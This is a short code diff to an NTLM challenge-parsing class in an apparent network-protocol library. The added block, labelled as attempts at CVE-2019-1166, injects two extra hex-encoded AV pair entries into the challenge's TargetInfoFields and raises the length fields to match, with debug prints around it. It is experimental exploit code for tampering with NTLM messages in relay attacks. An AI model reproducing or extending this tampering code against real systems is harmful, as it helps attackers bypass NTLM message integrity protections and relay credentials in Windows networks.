@@ -371,6 +371,31 @@ class NTLMAuthChallenge(Structure):
         Structure.fromString(self,data)
         self['domain_name'] = data[self['domain_offset']:][:self['domain_len']]
         self['TargetInfoFields'] = data[self['TargetInfoFields_offset']:][:self['TargetInfoFields_len']]
+        
+        #pit edits for cve-2019-1166 attempts
+        temp11 = self['TargetInfoFields'].encode('hex')
+        temp15 = self['TargetInfoFields']
+        temp22 = self['TargetInfoFields_len']
+        temp33 = self['TargetInfoFields_max_len']
+        print("NTLM_CHALLENGE TargetInfoField len:")
+        print(self['TargetInfoFields'])
+        print(self['TargetInfoFields_len'])
+        print(self['TargetInfoFields_max_len'])
+        print(len(temp15)) 
+
+        
+        tee = '0600040000000000'
+        print(len(tee))
+
+        fin = tee + tee + temp11
+        self['TargetInfoFields'] = fin.decode('hex')
+        self['TargetInfoFields_len'] = temp22 + 16
+        self['TargetInfoFields_max_len'] = temp33 + 16
+        print("NTLM_CHALLENGE TargetInfoField len:")
+        print(self['TargetInfoFields'])
+        print(self['TargetInfoFields_len'])
+        print(self['TargetInfoFields_max_len'])
+
         return self
         
 class NTLMAuthChallengeResponse(Structure, NTLMAuthMixin):
